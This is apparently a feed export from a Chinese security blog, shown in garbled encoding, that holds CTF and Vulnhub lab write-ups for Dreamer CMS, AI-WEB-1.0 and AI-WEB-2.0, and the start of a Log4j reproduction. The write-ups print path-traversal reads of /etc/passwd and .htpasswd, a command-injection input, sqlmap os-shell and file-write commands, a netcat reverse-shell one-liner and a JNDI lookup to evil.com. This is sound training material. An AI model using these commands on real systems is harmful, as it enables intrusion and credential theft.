&lt;p&gt;å‘ç°é¶æœºçš„ipåœ°å€ï¼Œäºæ˜¯å°è¯•è¿›è¡Œç«¯å£æ‰«æ&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="Vulnhub  DriftingBlues-1" scheme="https://ke1nys.github.io/tags/Vulnhub-DriftingBlues-1/"/>
    
  </entry>
  
  <entry>
    <title>èœç‹—-çº¢æ˜è°·-wp</title>
    <link href="https://ke1nys.github.io/posts/15f20e4d.html"/>
    <id>https://ke1nys.github.io/posts/15f20e4d.html</id>
    <published>2023-04-19T08:30:50.000Z</published>
    <updated>2023-04-26T13:05:32.236Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç‚¹å‡»ç­¾åˆ°"><a href="#ç‚¹å‡»ç­¾åˆ°" class="headerlink" title="ç‚¹å‡»ç­¾åˆ°"></a><strong>ç‚¹å‡»ç­¾åˆ°</strong></h2><p>åªéœ€è¦ä¸€ç›´ç‚¹å‡»å°±è¡Œï¼Œæœ€åä¼šåœ¨æœ«å°¾è¾“å‡ºflag</p><p><img src="../images/image-20230419163250747.png" alt="image-20230419163250747"></p><h2 id="Dreamer"><a href="#Dreamer" class="headerlink" title="Dreamer"></a><strong>Dreamer</strong></h2><p>é¢˜ç›®</p><p><img src="../images/image-20230419163405727.png" alt="image-20230419163405727"></p><p>ä¸€ä¸ªæ¡†æ¶</p><p>ä¸‹è½½é¢˜ç›®ç»™çš„æ–‡ä»¶ï¼Œå‘ç°åå°åœ°å€</p><p><img src="../images/image-20230419163458396.png" alt="image-20230419163458396"></p><p><strong>äºæ˜¯è¿›è¡Œç™»å½•</strong></p><p><img src="../images/image-20230419163537861.png" alt="image-20230419163537861"></p><p>ç„¶ågoogleæŸ¥æ‰¾è¯¥æ¼æ´å‘ç°</p><p><img src="../images/image-20230419163600887.png" alt="image-20230419163600887"></p><p><a href="https://forum.butian.net/share/2183">Dreamer CMS ä»£ç å®¡è®¡</a></p><p><img src="../images/image-20230419163637475.png" alt="image-20230419163637475"></p><p>è·Ÿç€æå°±èƒ½æ‹¿åˆ°flag</p><p><img src="../images/image-20230419163736391.png" alt="image-20230419163736391"></p><p>è®¿é—®å‰ç«¯é¡µé¢çš„testå°±è¡Œäº†</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ç‚¹å‡»ç­¾åˆ°&quot;&gt;&lt;a href=&quot;#ç‚¹å‡»ç­¾åˆ°&quot; class=&quot;headerlink&quot; title=&quot;ç‚¹å‡»ç­¾åˆ°&quot;&gt;&lt;/a&gt;&lt;strong&gt;ç‚¹å‡»ç­¾åˆ°&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;åªéœ€è¦ä¸€ç›´ç‚¹å‡»å°±è¡Œï¼Œæœ€åä¼šåœ¨æœ«å°¾è¾“å‡ºflag&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../im</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>vulnhub-AI-WEB-2.0</title>
    <link href="https://ke1nys.github.io/posts/32823e7e.html"/>
    <id>https://ke1nys.github.io/posts/32823e7e.html</id>
    <published>2023-04-17T14:06:01.000Z</published>
    <updated>2023-04-26T13:05:32.235Z</updated>
    
    <content type="html"><![CDATA[<p>æ‰«cæ®µ</p><p><img src="../images/image-20230417221049663.png" alt="image-20230417221049663"></p><p>æ¥ä¸‹æ¥è¿›è¡Œç«¯å£æ‰«æ</p><p><img src="../images/image-20230417221237184.png" alt="image-20230417221237184"></p><p><img src="../images/image-20230418222017787.png" alt="image-20230418222017787"></p><p><strong>è¿™é‡Œçš„è¯401çŠ¶æ€ç æ˜¯</strong></p><p><img src="../images/image-20230418222047797.png" alt="image-20230418222047797"></p><p><img src="../images/image-20230418222147639.png" alt="image-20230418222147639"></p><p><strong>å°±æ˜¯æ²¡æœ‰æˆåŠŸè¿›è¡Œèº«ä»½éªŒè¯çš„æ„æ€</strong>  å¾—éœ€è¦æ‹¿åˆ°ç®¡ç†å‘˜çš„è´¦å·å¯†ç </p><p>å‘ç°åªæœ‰ä¸¤ä¸ªæ®µå£ï¼Œäºæ˜¯è¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230417221348842.png" alt="image-20230417221348842"></p><p>è¿›è¡Œæ³¨å†Œç™»å½•åçš„å¾—åˆ°çš„ç•Œé¢</p><p><img src="../images/image-20230417222911811.png" alt="image-20230417222911811"></p><p>è¿™ä¸ªæ˜¯å…³é”® ï¼ˆåˆšå¼€å§‹çœ‹çš„æ—¶å€™éƒ½ä¸çŸ¥é“è¿™æ˜¯å•¥ç©æ„)  è¿˜æ˜¯æ¥è§¦å¤ªå°‘äº†</p><p><img src="../images/image-20230418222302600.png" alt="image-20230418222302600"></p><p>å‘ç°æ¼æ´åº“é‡Œç¡®å®å­˜åœ¨è¯¥æ¼æ´</p><p>è¿™é‡Œç¬¬ä¸‰ä¸ªæ–‡ä»¶å¯ä»¥è¿›è¡ŒæŸ¥çœ‹ï¼Œæœ‰ç‚¹åƒç›®å½•ç©¿è¶Šçš„æ¼æ´ï¼Œè¿›è¡Œåé¢è·¯å¾„çš„è¯»å–</p><p><img src="../images/image-20230418222613446.png" alt="image-20230418222613446"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/download.php?file_name=../../../../../../../../../../../../../etc/passwd  ##åˆ©ç”¨æ¼æ´çœ‹passwd</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230418222713281.png" alt="image-20230418222713281"></p><p><img src="../images/image-20230418222929738.png" alt="image-20230418222929738"></p><p>å‘ç°å¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Šæ¥è¯»å–æ–‡ä»¶</p><p><strong>åœ¨<code>/etc/passwd/</code>ä¸‹é¢å‘ç°äº† ä¸¤ä¸ªç”¨æˆ· åˆ†åˆ«æ˜¯ <code>aiweb2</code> <code>n0nr00tuser</code>å¯èƒ½ç­‰ä¸‹éœ€è¦ç”¨åˆ°å…ˆæ”¾ç€ æ¥ç€è¯»å–ä¸€ä¸‹<code>apache</code> æ–‡ä»¶</strong></p><p>è¯»å–apacheçš„é…ç½®æ–‡ä»¶æ˜¯å› ä¸ºç½‘ç«™æ˜¯ç”±apacheç»„æˆï¼Œå¹¶ä¸”/etc/shadowè®¿é—®ä¸äº†ï¼Œè¯»å–ä¸åˆ°æ–‡ä»¶å†…å®¹ï¼Œäºæ˜¯å°±ä»apacheçš„é…ç½®æ–‡ä»¶ä¸‹æ‰‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.105/download.php?file_name=../../../../../../../../../../../../../etc/apache2/sites-enabled/000-default.conf</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230418223246777.png" alt="image-20230418223246777"></p><p>è¿™é‡Œçš„è¯å°±è¯»å–åˆ°äº†ä¸€ä¸ªå¾ˆå…³é”®çš„ä¿¡æ¯äº†ï¼Œäºæ˜¯è¿›è¡Œè¯¥æ–‡ä»¶çš„æŸ¥çœ‹ï¼Œçœ‹æ˜¯å¦å­˜åœ¨ç”¨æˆ·çš„å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/download.php?file_name=../../../../../../../../../../../../../etc/apache2/.htpasswd</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230418223401204.png" alt="image-20230418223401204"></p><p>æŸ¥åˆ°äº†åŠ å¯†åçš„å¯†ç ï¼Œäºæ˜¯ä½¿ç”¨johnå·¥å…·è¿›è¡Œç ´è§£ï¼Œçœ‹å­—å…¸é‡Œæ˜¯å¦å­˜åœ¨è¯¥å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aiweb2admin:$apr1$VXqmVvDD$otU1gx4nwCgsAOA7Wi.aU/</span><br></pre></td></tr></table></figure><p><strong>æ–°å»ºä¸€ä¸ª<code>3.txt</code> æŠŠåŠ å¯†çš„å¤åˆ¶è¿›å»<code>aiweb2admin:$apr1$VXqmVvDD$otU1gx4nwCgsAOA7Wi.aU/</code>ä½¿ç”¨å·¥å…·<code>john</code> ç ´è§£ å‘ç° ç ´è§£å¤±è´¥</strong></p><p><img src="../images/image-20230418223628610.png" alt="image-20230418223628610"></p><p>é‚£çœ‹æ¥å­—å…¸é‡Œé¢æœ‰ï¼Œäºæ˜¯å»æœºå™¨é‚£è¾¹çœ‹åˆ°</p><p><img src="../images/image-20230418223804961.png" alt="image-20230418223804961"></p><p><strong>åé¢æ‰å‘ç° ç»™çš„æç¤ºæœ‰å­—å…¸çš„åç§°:<code>rockyou-45.txt</code> å»<code>github</code> ä¸Šé¢æ‰¾ä¸€ä¸ªä¸‹è½½ä¸€ä¸‹å³å¯ï¼ˆè¿™é‡Œæ²¡æœ‰å¤–ç½‘ æœ¬æœºä¸‹è½½æ‹–åˆ°kaliï¼‰</strong></p><p>è®°å¾—ä½¿ç”¨googleæœç´¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-45.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230418224240532.png" alt="image-20230418224240532"></p><p>æˆåŠŸå°†å­—å…¸ä¸‹è½½ä¸‹æ¥ï¼Œäºæ˜¯å†æ¬¡è¿›è¡Œç ´è§£</p><p><img src="../images/image-20230418230511475.png" alt="image-20230418230511475"></p><p>æŠŠå¯†ç ç ´è§£å‡ºæ¥äº†ï¼Œäºæ˜¯å°è¯•sshè¿æ¥</p><p><img src="../images/image-20230418230644880.png" alt="image-20230418230644880"></p><p>å‘ç°ç¡®å®ä¸æ˜¯è¿æ¥sshçš„å¯†ç ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸è¦å¿˜äº†å‰é¢çˆ†å‡ºæ¥çš„ä¸€ä¸ª401çš„ç½‘å€ï¼Œäºæ˜¯æˆ‘ä»¬å°è¯•è¿›è¡Œç™»å½•è¯•è¯•</p><p><img src="../images/image-20230418230806582.png" alt="image-20230418230806582"></p><p>æˆåŠŸç™»å½•æˆåŠŸï¼Œäºæ˜¯æˆ‘ä»¬å¼€å§‹æŸ¥çœ‹ï¼Œçœ‹å“ªäº›åœ°æ–¹å¯ä»¥è¿›è¡Œåˆ©ç”¨</p><p><img src="../images/image-20230418230848255.png" alt="image-20230418230848255"></p><p>è¯»å–robots.txtæ–‡ä»¶å‘ç°å­˜åœ¨ç›®å½•ï¼Œäºæ˜¯è¿›è¡Œè®¿é—®Â·</p><p>ç¬¬ä¸€ä¸ªæ˜¯ä¸€ä¸ªpingå‘½ä»¤ï¼Œ</p><p><img src="../images/image-20230418231326496.png" alt="image-20230418231326496"></p><p>æˆåŠŸè¿›è¡Œå‘½ä»¤çš„æ‰§è¡Œ</p><p>äºæ˜¯æŸ¥çœ‹ç¬¬äºŒä¸ªç›®å½•</p><p><img src="../images/image-20230418231728302.png" alt="image-20230418231728302"></p><p>è¯´æ˜¯æŸ¥æ‰¾è¿™ä¸ªç›®å½•ä¸‹çš„ä¿¡æ¯ï¼Œäºæ˜¯è¿›è¡Œç›®å½•æ‰«æï¼Œæ²¡å‘ç°å•¥ï¼Œä½†æ˜¯å‘¢ï¼Œæ˜¯ä¸æ˜¯å¯ä»¥åˆ©ç”¨ç¬¬ä¸€ä¸ªå¯ä»¥å‘½ä»¤æ‰§è¡Œçš„ä½œç”¨æ¥è¿›è¡ŒæŸ¥æ‰¾å‘¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|find ../S0mextras/ . -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>è¿”å›ä¸Šä¸€ä¸ªç›®å½•è¿›è¡Œè¿™ä¸ªç›®å½•æ–‡ä»¶çš„æŸ¥æ‰¾ï¼Œäºæ˜¯å‘ç°äº†å…³é”®ä¿¡æ¯</p><p><img src="../images/image-20230418232009793.png" alt="image-20230418232009793"></p><p>cat è¿›è¡Œè¯»å–</p><p><strong>User: n0nr00tuser</strong><br><strong>Cred: zxowieoi4sdsadpEClDws1sf</strong></p><p>äºæ˜¯å°è¯•è¿›è¡Œsshç™»å½•</p><p><img src="../images/image-20230418232157543.png" alt="image-20230418232157543"></p><p>æˆåŠŸæ‹¿åˆ°æœåŠ¡å™¨çš„æƒé™ï¼Œåªä¸è¿‡æ˜¯ä½æƒé™</p><p>å°è¯•è¿›è¡Œææƒ</p><p>sudo -l ä¸è¡Œ å°è¯•suid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230420213253604.png" alt="image-20230420213253604"></p><p>å‡ºç°äº†ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ‘ä»¬å¾—è€ƒè™‘è®©ä»–æ¥è¿›è¡Œææƒ</p><p>äºæ˜¯å°±å…ˆæŸ¥çœ‹æŸ¥çœ‹å†…æ ¸ï¼Œçœ‹èƒ½ä¸èƒ½æ‰¾åˆ°æ¼æ´</p><p><img src="../images/image-20230420213426543.png" alt="image-20230420213426543"></p><p><img src="../images/image-20230420213435027.png" alt="image-20230420213435027"></p><p>äºæ˜¯è¿›è¡Œæ¼æ´åˆ©ç”¨ï¼Œçœ‹èƒ½ä¸èƒ½åˆ©ç”¨è¯¥äºŒè¿›åˆ¶æ–‡ä»¶é…åˆè¿™ä¸ªshæ–‡ä»¶è¿›è¡Œææƒ</p><p><img src="../images/image-20230420213549472.png" alt="image-20230420213549472"></p><p>æ‹¿åˆ°å®Œæ•´è·¯å¾„</p><p><img src="../images/image-20230420213646773.png" alt="image-20230420213646773"></p><p>è·Ÿç€é‡Œé¢çš„æ­¥éª¤ä¸€æ­¥ä¸€æ­¥æ¥å†™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/saghul/lxd-alpine-builder/</span><br></pre></td></tr></table></figure><p><strong>ä¸‹è½½å¥½äº†æ‹–åˆ°<code>kali</code>é‡Œé¢ ç„¶åè§£å‹ è¿è¡Œ<code>./build-alpine</code> ä¼šä¸‹è½½ä¸€ä¸ª<code>apk</code>çš„æ–‡ä»¶</strong></p><p><img src="../images/image-20230420214122839.png" alt="image-20230420214122839"></p><p>æ¥ä¸‹æ¥ç‚¹è¿è¡Œ<strong><code>build-alpine</code></strong></p><p>ç„¶åä¼šä¸‹è½½ä¸€ä¸ªapkæ–‡ä»¶</p><p><img src="../images/image-20230420214253688.png" alt="image-20230420214253688"></p><p>ç„¶åæŠŠä»–ä¼ åˆ°é¶æœºä¸Š</p><p><img src="../images/image-20230420214404838.png" alt="image-20230420214404838"></p><p>æˆåŠŸè¿›è¡Œä¼ é€</p><p><img src="../images/image-20230420214641055.png" alt="image-20230420214641055"></p><p>æŠŠå†…æ ¸ææƒç»™çš„expä¹Ÿä¼ è¿‡å»</p><p><img src="../images/image-20230420214722826.png" alt="image-20230420214722826"></p><p>äºæ˜¯å°è¯•è¿›è¡Œææƒ</p><p>å…ˆç»™ä»–ä¸¤ç»™ä¸€ä¸‹è¿è¡Œçš„æƒé™</p><p><img src="../images/image-20230420214853460.png" alt="image-20230420214853460"></p><p>æ¥ä¸‹æ¥ç›´æ¥è¿›è¡Œææƒæ“ä½œ</p><p><img src="../images/image-20230420215012652.png" alt="image-20230420215012652"></p><p>æŸ¥çœ‹ç”¨æ³•ï¼Œç„¶åç›´æ¥è¿›è¡Œææƒ</p><p><img src="../images/image-20230420215055452.png" alt="image-20230420215055452"></p><p>ç›´æ¥å°±æ˜¯rootæƒé™äº†</p><p><img src="../images/image-20230420215228022.png" alt="image-20230420215228022"></p><p>æ‰¾åˆ°flagä½ç½®</p><p><img src="../images/image-20230420215302055.png" alt="image-20230420215302055"></p><p>æ‹¿ä¸‹ï¼Œå°±æ˜¯å†…æ ¸ææƒ</p><p><strong>å’Œsuidæ‰¾å‡ºæ¥çš„äºŒè¿›åˆ¶æ–‡ä»¶æ²¡å•¥å…³ç³»</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æ‰«cæ®µ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230417221049663.png&quot; alt=&quot;image-20230417221049663&quot;&gt;&lt;/p&gt;
&lt;p&gt;æ¥ä¸‹æ¥è¿›è¡Œç«¯å£æ‰«æ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/im</summary>
      
    
    
    
    
    <category term="vulnhub AI-WEB-2.0" scheme="https://ke1nys.github.io/tags/vulnhub-AI-WEB-2-0/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-AI-WEB-1.0</title>
    <link href="https://ke1nys.github.io/posts/30c48027.html"/>
    <id>https://ke1nys.github.io/posts/30c48027.html</id>
    <published>2023-04-17T13:07:30.000Z</published>
    <updated>2023-04-26T13:05:32.234Z</updated>
    
    <content type="html"><![CDATA[<p>å…ˆæ‰«ä¸€ä¸‹cæ®µ</p><p><img src="../images/image-20230417210846503.png" alt="image-20230417210846503"></p><p>å‘ç°ä¸»æœº</p><p>æ¥ä¸‹æ¥è¿›è¡Œç«¯å£æ‰«æ</p><p><img src="../images/image-20230417210949458.png" alt="image-20230417210949458"></p><p>å‘ç°åªæ‰«åˆ°äº†ä¸€ä¸ª80ç«¯å£</p><p>äºæ˜¯å°è¯•è¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230417211102655.png" alt="image-20230417211102655"></p><p>å°±å‡ºç°è¿™ä¸ªç©æ„</p><p>ç„¶åè¿›è¡Œç›®å½•æ‰«æ</p><p><img src="../images/image-20230417211628147.png" alt="image-20230417211628147"></p><p>å‘ç°å­˜åœ¨ä¸€ä¸ª<code>robots.txt</code>æ–‡ä»¶,äºæ˜¯è¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230417211745316.png" alt="image-20230417211745316"></p><p><strong>å‘ç°äº†ç½‘ç»œçˆ¬è™«åè®® <code>robots</code> è®¿é—®ä¸€ä¸‹ å‘ç°äº†ä¸¤ä¸ªç›®å½•<code>/m3diNf0/</code>å’Œ<code>/se3reTdir777/uploads/</code>ä¾æ¬¡è¿›è¡Œè®¿é—®ã€‚</strong></p><p><img src="../images/image-20230417211841895.png" alt="image-20230417211841895"></p><p><img src="../images/image-20230417211903531.png" alt="image-20230417211903531"></p><p>ä¸¤ä¸ªè®¿é—®å…¨æ˜¯è®¿é—®ä¸äº†ï¼Œäºæ˜¯å°è¯•æ¥ç€è¿›è¡Œç›®å½•æ‰«æ</p><p><img src="../images/image-20230417211950534.png" alt="image-20230417211950534"></p><p>ä¸¤ä¸ªç›®å½•åªæ‰«å‡ºä¸€ä¸ªç›®å½•èƒ½è¿›è¡Œè®¿é—®ï¼Œäºæ˜¯å°è¯•è¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230417212052641.png" alt="image-20230417212052641"></p><p>æ‰§è¡Œäº†phpinfo  ï¼Œé€šè¿‡è¿™ä¸ªæ¥æŸ¥çœ‹æœ‰æ²¡æœ‰å…³é”®ä¿¡æ¯</p><p><img src="../images/image-20230417212219650.png" alt="image-20230417212219650"></p><p>å‘ç°äº†ç½‘ç«™çš„ç»å¯¹è·¯å¾„è¿˜æœ‰å¦ä¸€ä¸ªè·¯å¾„<code>/se3reTdir777/uploads/</code> å‘ç°äº†ä¸€ä¸ª<code>index.php</code></p><p><img src="../images/image-20230417212408231.png" alt="image-20230417212408231"></p><p><img src="../images/image-20230417212520842.png" alt="image-20230417212520842"></p><p>è®¿é—®è¯¥ç½‘ç«™ï¼Œè§‰å¾—åƒæ˜¯å­˜åœ¨sqlæ³¨å…¥ï¼Œäºæ˜¯è¿›è¡Œsqlmapæµ‹è¯•</p><p><img src="../images/image-20230417212637629.png" alt="image-20230417212637629"></p><p>æŸ¥æ•°æ®åº“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.138/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --dbs #åˆ—å‡ºåº“</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417212759476.png" alt="image-20230417212759476"></p><p>æŸ¥å‡ºæ•°æ®åº“ï¼Œç„¶åè¿›è¡Œè¡¨çš„æŸ¥è¯¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.138/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  -D aiweb1 --tables #åˆ—å‡ºè¡¨</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417212859296.png" alt="image-20230417212859296"></p><p>æŸ¥å‡ºè¡¨ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¿›è¡Œåˆ—çš„æŸ¥è¯¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.138/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  -D aiweb1 -T user --columns #åˆ—å‡ºå­—æ®µ</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417212948686.png" alt="image-20230417212948686"></p><p>çœ‹èµ·æ¥æ²¡å•¥å¯åˆ©ç”¨çš„ä¿¡æ¯ï¼Œè€Œä¸”ç½‘ç«™é¡µæ²¡å•¥å¯ç”¨çš„ä¸œè¥¿ï¼Œäºæ˜¯è€ƒè™‘åˆ©ç”¨sqlmapè¿›è¡Œshellçš„åå¼¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.138/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --level=3 --os-shell </span><br></pre></td></tr></table></figure><p><strong>é€‰æ‹©<code>php(default)</code>ï¼Œ<code>custom location(s)</code> ç„¶åè¾“å…¥åˆšåˆšè·å–åˆ°çš„è·¯å¾„ï¼š<code>/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</code></strong></p><p><strong>è·å–åˆ°<code>shell</code> ä½†æ˜¯æƒé™æ¯”è¾ƒä½æ˜¯<code>www-data</code></strong></p><p><img src="../images/image-20230417214433781.png" alt="image-20230417214433781"></p><p><img src="../images/image-20230417214422725.png" alt="image-20230417214422725"></p><p>è¿™é‡Œçš„è”ç³»çœŸçš„å¾ˆå¯†åˆ‡ï¼Œå°±æ˜¯ç»™çš„ä¸œè¥¿æ˜¯ä¸€å®šä¼šç”¨åˆ°çš„</p><p>è¿™é‡Œç”±äºæ˜¯ä¸Šä¼ æ–‡ä»¶ç›®å½•ï¼Œäºæ˜¯æˆ‘ä»¬å†™ä¸€å¥è¯æœ¨é©¬è¿›å»ï¼Œç„¶åå°è¯•èšå‰‘è¿æ¥</p><p><img src="../images/image-20230417214918819.png" alt="image-20230417214918819"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.138/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --file-write ./hack.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/hack.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417215049771.png" alt="image-20230417215049771"></p><p><strong>æ¥ç€è®¿é—®<code>http://192.168.142.138/se3reTdir777/uploads/hack.php</code> å¦‚æœæ˜¯ç©ºç™½çš„è¯´æ˜ä¸Šä¼ çš„æœ¨é©¬æˆåŠŸäº†ï¼ï¼ ç›´æ¥ä¸Š<code>WebSell</code>å·¥å…· èšå‰‘è¿æ¥</strong></p><p><img src="../images/image-20230417215216558.png" alt="image-20230417215216558"></p><p>ä¸Šä¼ æˆåŠŸï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°è¯•è¿›è¡Œææƒ</p><p>ä½¿ç”¨èšå‰‘è¿›è¡Œshellçš„åå¼¹æ“ä½œ</p><ol><li><strong>ç°åœ¨kaliä¸Šé¢ç›‘å¬ä¸€ä¸‹ç«¯å£ä½¿ç”¨å‘½ä»¤ï¼š nc -lvvp 6666</strong></li><li><strong>nc -e /bin/bash 192.168.0.103 6666ï¼ˆå‘ç°-eå‚æ•°ä¸å¯ç”¨ï¼‰</strong></li><li><strong>ä½¿ç”¨å‘½ä»¤ï¼šrm /tmp/f;mkfifo/tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.142.129 6666 &gt;/tmp/fï¼ˆå›å¼¹äº†shellï¼‰</strong></li><li><strong>ä½¿ç”¨å‘½ä»¤ï¼špython -c â€œimport pty;pty.spawn(â€˜/bin/bashâ€™)â€ï¼ˆpythonå†™äº¤äº’ï¼‰</strong></li></ol><p>æœ‰äº›æ—¶å€™å°±æ˜¯ä¸æ”¯æŒ  -e shellçš„åå¼¹ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯rmåå¼¹</p><p><img src="../images/image-20230417215609447.png" alt="image-20230417215609447"></p><p>æˆåŠŸè¿›è¡Œäº†shellçš„åå¼¹</p><p><strong>äºæ˜¯æ¥ä¸‹æ¥å°±è¿›è¡Œææƒçš„æ“ä½œäº†</strong></p><p>å› ä¸ºè¿™é‡Œåå¼¹shellä¹‹åæ²¡åŠ¨é™äº†ï¼Œäºæ˜¯å°±ä¸å†™äº†ï¼Œææƒçš„è¯å’ŒDC-9çš„æ–¹æ³•æ˜¯ä¸€æ ·çš„ï¼Œç»™/etc/passwdåé¢æ·»åŠ ä¸€æ¡</p><p>ç„¶ååˆ‡æ¢ idå°±æ˜¯rootæƒé™äº†</p><p><a href="https://blog.csdn.net/Aluxian_/article/details/124434294">å‰©ä¸‹çš„ææƒæ“ä½œ</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å…ˆæ‰«ä¸€ä¸‹cæ®µ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230417210846503.png&quot; alt=&quot;image-20230417210846503&quot;&gt;&lt;/p&gt;
&lt;p&gt;å‘ç°ä¸»æœº&lt;/p&gt;
&lt;p&gt;æ¥ä¸‹æ¥è¿›è¡Œç«¯å£æ‰«æ&lt;/p&gt;
&lt;p&gt;&lt;img sr</summary>
      
    
    
    
    
    <category term="vulnhub AI-WEB-1.0" scheme="https://ke1nys.github.io/tags/vulnhub-AI-WEB-1-0/"/>
    
  </entry>
  
  <entry>
    <title>vulhub-log4jæ¼æ´å¤ç°</title>
    <link href="https://ke1nys.github.io/posts/cca4fef7.html"/>
    <id>https://ke1nys.github.io/posts/cca4fef7.html</id>
    <published>2023-04-17T09:40:03.000Z</published>
    <updated>2023-04-26T13:05:32.234Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2021-44228-Apache-Log4j-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#CVE-2021-44228-Apache-Log4j-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="CVE-2021-44228 Apache Log4j è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>CVE-2021-44228 Apache Log4j è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h2><h4 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a><strong>æ¼æ´æè¿°</strong></h4><p>Apache Log4j 2 æ˜¯Javaè¯­è¨€çš„æ—¥å¿—å¤„ç†å¥—ä»¶ï¼Œä½¿ç”¨æä¸ºå¹¿æ³›ã€‚åœ¨å…¶2.0åˆ°2.14.1ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€å¤„JNDIæ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…åœ¨å¯ä»¥æ§åˆ¶æ—¥å¿—å†…å®¹çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ä¼ å…¥ç±»ä¼¼äº${jndi:ldap://evil.com/example}çš„lookupç”¨äºè¿›è¡ŒJNDIæ³¨å…¥ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p>å‚è€ƒåœ°å€ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">https</span>:<span class="comment">//github.com/vulhub/vulhub</span></span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p>æœ¬æ¬¡æ¼æ´å¤ç°ä¹Ÿæ˜¯åŸºäºVulhub</p><h4 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d --build</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417174622063.png" alt="image-20230417174622063"></p><p>è®¿é—®<code>http://127.0.0.1:8983/solr/#/</code></p><p><img src="../images/image-20230417174936629.png" alt="image-20230417174936629"></p><p><strong>è¿›è¡Œdnsæµ‹è¯•çœ‹æ˜¯å¦å­˜åœ¨æ¼æ´</strong></p><p>å…ˆæ‹¿ä¸€ä¸ªåŸŸå</p><p><img 